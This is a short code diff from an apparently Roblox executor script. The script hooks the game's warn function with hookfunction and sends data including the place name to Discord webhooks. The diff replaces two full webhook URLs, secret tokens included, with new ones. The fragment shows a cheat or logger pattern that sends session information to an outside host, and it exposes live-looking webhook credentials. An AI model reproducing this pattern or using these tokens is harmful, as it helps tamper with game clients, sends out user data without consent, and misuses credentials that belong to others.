@@ -20,7 +20,7 @@ game.Players.LocalPlayer.Character.Humanoid.Jump = true
 
  
 local url =
-   "https://discord.com/api/webhooks/914113925073752095/aAa1x4jj-WibgLBIoO7cdMu_myT5kmOqBerWsmXbwg0YlyjHNx8z_Xh4hBqCAet174rE"
+   "https://discord.com/api/webhooks/924244458151772181/evFcF-iTImGgrGSChmP76ODloGyokG3zwtFnPXq0K-PQGSWgyen1OLuTa2ILQnx2TxbcE"
 local data = {
    ["content"] = "** PlaceName : "..placeName.."**",
    ["embeds"] = {
@@ -70,7 +70,7 @@ h = hookfunction(warn,function(urprint,...)
  return g(urprint,...)
 end)
 
-local webh = "https://discord.com/api/webhooks/914189872045125643/oe-0dOpkoYV7oh1KSyir2_HHmDshiEbhP4TFICmooU3JsXIPJNzszaXGh_2wHJ2GMjYR"
+local webh = "https://discord.com/api/webhooks/924244634216042556/0B4Kk8iGh3NA7IWVS328W2dpY764KieKQtXb5qnqZ7EuhiV0nAUAK87QnNYsoS_XLmac"
 
 pcall(function()
    local data = {
